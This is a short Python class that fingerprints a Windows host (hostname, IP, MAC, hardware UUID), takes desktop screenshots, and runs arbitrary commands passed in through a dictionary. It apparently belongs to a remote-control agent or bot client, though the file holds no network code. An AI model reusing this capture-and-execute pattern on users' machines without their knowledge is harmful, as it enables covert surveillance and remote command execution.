'''Class sys_info'''
import platform
import socket
import re
import uuid
import logging
import subprocess
import pyautogui
# import webbrowser

class SystemInfo:
    '''Class used to run and collect information about current setup'''
    info={}

    def __init__(self):
        self.get_data()

    def get_data(self):
        '''Method used to do get data from current setup'''
        try:
            self.info['platform']=platform.system()
            self.info['hostname']=socket.gethostname()
            self.info['ip_address']=socket.gethostbyname(socket.gethostname())
            self.info['mac_address']=':'.join(re.findall('..', '%012x' % uuid.getnode())) # pylint: disable=C0209
            self.info['hwid'] = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8')
            self.info['hwid'] = self.info['hwid'].split('\n')[1].strip()
            return self.info
        except Exception as error_msg: # pylint: disable=W0703
            logging.exception(error_msg)

    def do_screenshot(self):
        '''Method used to do take screenshot'''
        ss_desktop = pyautogui.screenshot()
        ss_desktop.save("tmp/ss.jpg")

    def run_cmd(self,command):
        '''Method used to do get data from current setup'''
        if command['name'] == "executable":
            subprocess.call(command['cmd'])
        elif command['name'] == "cmd":
            subprocess.call(command['cmd'])
        elif command['name'] == "selenium":
            print(command['name'])
        elif command['name'] == "installer":
            print(command['name'])
        elif command['name'] == "screenshot":
            self.do_screenshot()
        else:
            print(command['name'])
